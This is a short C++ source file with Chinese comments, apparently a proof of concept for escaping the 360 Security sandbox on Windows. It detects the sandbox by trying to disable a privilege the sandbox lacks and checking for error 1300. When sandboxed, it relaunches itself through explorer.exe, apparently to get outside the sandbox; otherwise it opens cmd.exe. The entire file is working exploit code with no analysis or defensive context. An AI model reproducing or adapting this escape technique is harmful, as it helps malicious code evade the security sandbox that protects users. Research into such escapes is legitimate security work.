// 360SecuritySandboxEscape.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <strsafe.h>

/// <summary>
/// 通过禁用沙盒中不存在的特权 SeShutdownPrivilege 触发1300异常
/// </summary>
/// <returns></returns>
INT CheckShadowBox() {
    HANDLE hToken = NULL;
    LUID luid;
    DWORD rt = 0;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        rt = GetLastError();
        printf("[-] OpenProcessToken error:%d.\n", rt);
        CloseHandle(hToken);
        return rt;
    }
    
    if (LookupPrivilegeValue(NULL,// lookup privilege on local system
        SE_SHUTDOWN_NAME,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        tp.Privileges[0].Luid = luid;
        //disable SE_SHUTDOWN_NAME privilege.
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
            rt = GetLastError();
            printf("[-] AdjustTokenPrivileges error:%d \n", rt);
        }
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            rt = GetLastError();
            printf("[-] The token does not have the specified privilege:%d.\n", rt);
            return rt;
        }

    }
    else {
        rt = GetLastError();
        printf("[-] LookupPrivilegeValue error:%d\n", rt);
    }
    CloseHandle(hToken);
    return rt;
}

// 创建新进程
BOOL SpawnProcess(char* runcmdline) {
    printf("[*] Runcmdline:%s\n", runcmdline);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL, runcmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) { return FALSE; }
    printf("[+] ProcessId：%d \n", pi.dwProcessId);
    printf("[+] ThreadId：%d \n", pi.dwThreadId);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

int main(int argc, char* argv[])
{
    char Run[MAX_PATH] = "explorer.exe ";
    StringCchCat(Run, MAX_PATH, argv[0]);
    if (1300 == CheckShadowBox()) {
        // 在沙箱中，执行POC
        printf("[*] Found 1300 , In ShadowBox\n");
        SpawnProcess(Run);
    }
    else {
        // 不在沙箱中
        printf("[*] Not in ShadowBox,Run CMD ...\n");
        SpawnProcess((char*)"cmd.exe");
    }
    return 0;
}